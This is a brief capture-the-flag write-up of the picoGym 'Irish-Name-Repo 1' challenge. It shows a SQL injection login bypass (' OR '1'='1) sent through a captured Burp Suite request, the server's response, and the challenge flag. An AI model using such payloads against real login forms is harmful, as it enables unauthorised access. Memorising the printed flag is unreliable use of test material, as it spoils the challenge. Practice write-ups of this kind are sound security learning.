# picoGym Level 80: Irish-Name-Repo 1
Source: https://play.picoctf.org/practice/challenge/80

## Goal
There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ or<br>
http://jupiter.challenges.picoctf.org:39720<br>
Do you think you can log us in? Try to see if you can login!

## What I learned
```
SQL Injection
```             

## Solution
```
https://webshell.picoctf.org/

ChatGPT SQL Injection Code: ' OR '1'='1 👀

# Burp Suite
POST /login.php HTTP/1.1
Host: jupiter.challenges.picoctf.org:39720
Content-Length: 53
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://jupiter.challenges.picoctf.org:39720
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://jupiter.challenges.picoctf.org:39720/login.html
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.2.647513796.1755785140; _ga_L6FT52K063=GS2.2.s1755785141$o1$g1$t1755785333$j60$l0$h844368113
Connection: keep-alive

username=admin&password=%27+OR+%271%27%3D%271&debug=0

# Forward
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p> 🔐
```

## Flag
picoCTF{s0m3_SQL_c218b685}

## Continue
[Continue](./picoGym0059.md)